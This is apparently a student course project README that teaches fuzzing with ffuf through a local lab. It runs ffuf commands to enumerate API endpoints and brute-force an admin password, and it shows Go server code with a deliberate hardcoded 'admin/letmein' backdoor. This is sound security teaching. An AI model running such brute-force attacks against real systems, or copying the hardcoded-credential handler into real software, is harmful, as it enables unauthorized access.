# CSE433-ffuf-fuzzing-project

- [CSE433-ffuf-fuzzing-project](#cse433-ffuf-fuzzing-project)
		- [Jayce Bordelon | Kiran Bhat | Oliver Sohn](#jayce-bordelon--kiran-bhat--oliver-sohn)
- [What is fuzzing?](#what-is-fuzzing)
  	- [How are fuzzers used?](#how-are-fuzzers-used)
- [What is ffuf?](#what-is-ffuf)
	- [Installing ffuf cli](#installing-ffuf-cli)
		- [MacOS (Homebrew)](#macos-homebrew)
		- [Windows (Scoop)](#windows-scoop)
		- [Linux (via golang)](#linux-via-golang)
	- [Using ffuf](#using-ffuf)
		- [ffuf capabilities:](#ffuf-capabilities)
		- [It also has a ton of helpful cli options that can be found by running:](#it-also-has-a-ton-of-helpful-cli-options-that-can-be-found-by-running)
- [Tutorial](#tutorial)
	- [Practical application 1: Basic endpoint fuzzing exploit via word file to get HTTP server auth bypass](#practical-application-1-basic-endpoint-fuzzing-exploit-via-word-file-to-get-http-server-auth-bypass)
		- [Finding the endpoints](#finding-the-endpoints)
		- [Bypassing auth backdoor](#bypassing-auth-backdoor)

### Jayce Bordelon | Kiran Bhat | Oliver Sohn

# What is fuzzing?

Fuzzing is atesting strategy that involves generating random/unexpected inputs in order to discover unusual/unwanted behavior. The main purpose of fuzzing is to explore unexpected behaviors that are beyond the scope of parameters of the systems intended usage  construction. 

## How are fuzzers used?

Fuzzers can be used as a black box or white box operation, but are usually used as a black box strategy to find errors and bugs. There's also different variations of fuzzing based on the specifications of the system being tested. For example, we can give fuzzers information about the style of accepted inputs to give it an advantage when generating inputs, called "smart" fuzzing. On the other hand, we can also perform "dumb" fuzzing by giving it no information in order to test more broadly. We can even change the way in which the fuzzer generates its input based on what aspects of the system we are examining, two common forms of input creation are generative and mutative. Mutative fuzzing takes a starting point input and randomly modifies (using common operations such as bit-flipping), whereas generative fuzzing creates entirely new random inputs. Because these inputs are generated from scratch, generative fuzzing requires at least a baseline level of information about input type, meaning they cannot be performed with truly "dumb" fuzzing

# What is ffuf?

ffuf is a fast web fuzzer (literally stands for fuzz faster u fool) written in Go that allows typical directory discovery, virtual host discovery (without DNS records) and GET and POST parameter fuzzing.

This program is useful for pentesters, ethical hackers and forensics experts. It also can be used for security tests.

[Kali linux source](https://www.kali.org/tools/ffuf/)

## Installing ffuf cli

### MacOS (Homebrew)

```bash
brew install ffuf
```

### Windows (Scoop)

```bash
Set-ExecutionPolicy RemoteSigned -scope CurrentUser
iwr -useb get.scoop.sh | iex
scoop install ffuf
```

### Linux (via golang)

```bash
sudo apt install golang  # or your distro's Go package
go install github.com/ffuf/ffuf/v2@latest
# you may also need to run:
export PATH=$PATH:$HOME/go/bin
```

## Using ffuf

### ffuf capabilities:

1. Finiding hidden directories and paths via brute force
2. Testing query parameters for bugs or injections
3. Fuzzing the request body—great for login forms or API payloads (bypassing auth potentially).
4. Testing for header-based bypasses or secrets (e.g. X-API-Key, Host).

### It also has a ton of helpful cli options that can be found by running:

```
ffuf -h
```

# Tutorial

We will now walk through a few examples of how this tool can be used in practice.

## Practical application: Basic endpoint fuzzing exploit via word file to get HTTP server auth bypass

### Finding the endpoints

> **_NOTE:_** You will need to run the server exec file if you are following along. You can do this by running `./build/backdoor-server`

Our goal is to bypass authentication for this server and get a valid login without knowing anything except for the fact that this is an http server with basic api routes. That is where fuzzing comes in.

We want to find all the endpoints associated with this api. Lucky for us,there is an enormous list of common endpoints accessible for free on the internet [Like this one :)](https://wordlists-cdn.assetnote.io/data/automated/httparchive_apiroutes_2024_05_28.txt). We will feed all of these endpoints into ffuf to sniff out the api structure:

```bash
ffuf -w ./word-lists/endpoints.txt -u http://localhost:8080FUZZ -fc 404,301 -v -r
```

Let's break this command down:

1. ffuf : the cli for fuzzing
2. -w /path/to/filename.txt : this flag indicates what filepath the word list we will use is in
3. -u http://target.com : the url that we are making requests to (GET by default)
4. -fc status' : statuses to ignore. in this case, we will be ignoring any NOT FOUND (404) requests or MOVED PERMENANTLY (301) because go treats incomplete paths as 301 (such as a req to /admin when only /admin/... exists).
5. -v : verbose logging for any hits (2XX response)
6. -r : recursively handle following redirects for urls

In short, ffuf is making get requests to any common routes in `./word-lists/endpoints.txt` to `http://localhost:8080{endpoint (FUZZ)}` and logging only found routes.

After running the server, now run

```bash
ffuf -w ./word-lists/endpoints.txt:PATH -u http://localhost:8080FUZZ -fc 404,301 -v -r
```

If your server is running, you should have gotten the following output:

```bash
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://localhost:8080FUZZ
 :: Wordlist         : FUZZ: /Users/jaycebordelon/CSE433/final-project/CSE433-fuff-fuzzing-project/word-lists/endpoints.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404,301
________________________________________________

[Status: 200, Size: 15, Words: 3, Lines: 2, Duration: 0ms]
| URL | http://localhost:8080/api/v2/status
    * FUZZ: /api/v2/status

[Status: 405, Size: 18, Words: 3, Lines: 2, Duration: 0ms]
| URL | http://localhost:8080/api/v1/login
    * FUZZ: /api/v1/login

[Status: 200, Size: 22, Words: 4, Lines: 2, Duration: 0ms]
| URL | http://localhost:8080/api/v2/info
    * FUZZ: /api/v2/info

[Status: 405, Size: 18, Words: 3, Lines: 2, Duration: 0ms]
| URL | http://localhost:8080/api/v2/login
    * FUZZ: /api/v2/login

:: Progress: [275993/275993] :: Job [1/1] :: 100000 req/sec :: Duration: [0:00:04] :: Errors: 1 ::

```

We have now discovered the following endpoints:

1. /api/v2/status -> 200 GET
2. /api/v2/info -> 200 GET
3. /api/v2/login -> 405 GET ?
4. /api/v1/login -> 405 GET !?

### Bypassing auth backdoor

Because our goal is to bypass auth with fuzzing, let's focus on `/api/v2/login` and `/api/v1/login`. Typically api's handle logins via POST with a username & password. Sometimes, unsecure web applications even have some super secret admin login (thought this example will be aggregiously insecure). We can confirm this is the case with a simple curl request:

```bash
# v2
curl -X POST http://localhost:8080/api/v2/login -H "Content-Type: application-json" -d '{"username":"???","password":"???"}'
# The strange v1 ?
curl -X POST http://localhost:8080/api/v1/login -H "Content-Type: application-json" -d '{"username":"???","password":"???"}'

```

Both routes now respond with "Invalid Credentials" rather than "Invalid JSON". What if we test our theory about the "admin" login?

```bash
# v2
curl -X POST http://localhost:8080/api/v2/login -H "Content-Type: application-json" -d '{"username":"admin","password":"???"}'
# The strange v1 ?
curl -X POST http://localhost:8080/api/v1/login -H "Content-Type: application-json" -d '{"username":"admin","password":"???"}'
```

Responses:

- v2 : Invalid credentials <- Same
- v1 : Incorrect password for admin <- Now were talking

So, this clues in that there may be some admin password auth left in the v1 of the server? Sounds like a great time to brute force with another fuzzing command:

```bash
ffuf -w ./word-lists/passwords.txt:PASS -u http://localhost:8080/api/v1/login -X POST -H "Content-Type: application/json" -d '{"username":"admin", "password":"PASS"}' -fc 401,400,405,403 -v
```

This command is mostly the same as the one to find endpoints except for:

- Method is now POST : set with -X POST
- Passwords are now passed via the JSON body as they are dynamically read from the [password file](./word-lists/passwords.txt) : -d '{"username":"admin", "password":"PASS"}'
- Now ignoring only failed auth status codes : -fc 401, 400, 405,403

Run the following:

```bash
ffuf -w ./word-lists/passwords.txt:PASS -u http://localhost:8080/api/v1/login -X POST -H "Content-Type: application/json" -d '{"username":"admin", "password":"PASS"}' -fc 401,400,405,403 -v
```

You will see an output indicating which request had a success code:

```bash
ffuf -w ./word-lists/passwords.txt:PASS -u http://localhost:8080/api/v1/login -X POST -H "Content-Type: application/json" -d '{"username":"admin", "password":"PASS"}' -fc 401,400,405,403 -v

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://localhost:8080/api/v1/login
 :: Wordlist         : PASS: /Users/jaycebordelon/CSE433/final-project/CSE433-fuff-fuzzing-project/word-lists/passwords.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"username":"admin", "password":"PASS"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 401,400,405,403
________________________________________________

[Status: 200, Size: 16, Words: 2, Lines: 2, Duration: 0ms]
| URL | http://localhost:8080/api/v1/login
    * PASS: letmein

:: Progress: [1002/1002] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

WOAH! So the password for admin is `letmein` !!!

Let's give it a shot:

```bash
curl -X POST http://localhost:8080/api/v1/login -H "Content-Type: application-json" -d '{"username":"admin","password":"letmein"}'

Welcome, admin!
```

And we're in! But, how did that work? Let's take a look at the server code in [main](./backdoor-server/main.go):

```go
package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
)

func main() {
	http.HandleFunc("/api", apiHandler)
	// OOPS!!!! Legacy code pushed to prod :(
	http.HandleFunc("/api/v1/login", legacyLoginHandler)
	http.HandleFunc("/api/v2/info", infoHandler)
	http.HandleFunc("/api/v2/status", statusHandler)
	http.HandleFunc("/api/v2/login", loginHandler)

	fmt.Println("Server running on http://localhost:8080")
	http.ListenAndServe(":8080", nil)
}

// ... Handlers defined here
```

Uh oh! looks like the dev left the v1 login in the server! Lets look at what that handler does:

```go
// LEGACY CODE - Vulnerable back door to admin
func legacyLoginHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
		return
	}

	var creds struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}

	err := json.NewDecoder(r.Body).Decode(&creds)
	if err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	log.Printf("Login attempt: username=%s, password=%s\n", creds.Username, creds.Password)

  // HERE IS THE BACKDOOR
	if creds.Username == "admin" && creds.Password == "letmein" {
		fmt.Fprintf(w, "Welcome, admin!\n")
		return
	} else if creds.Username == "admin" {
		http.Error(w, "Incorrect password for admin.\n", http.StatusForbidden)
		return
	}

	http.Error(w, "Invalid credentials", http.StatusUnauthorized)
}
```

We now have gone from knowing absolutely nothing about an api to bypassing an admin authentication in a legacy route that was left in the server through fuzzing.
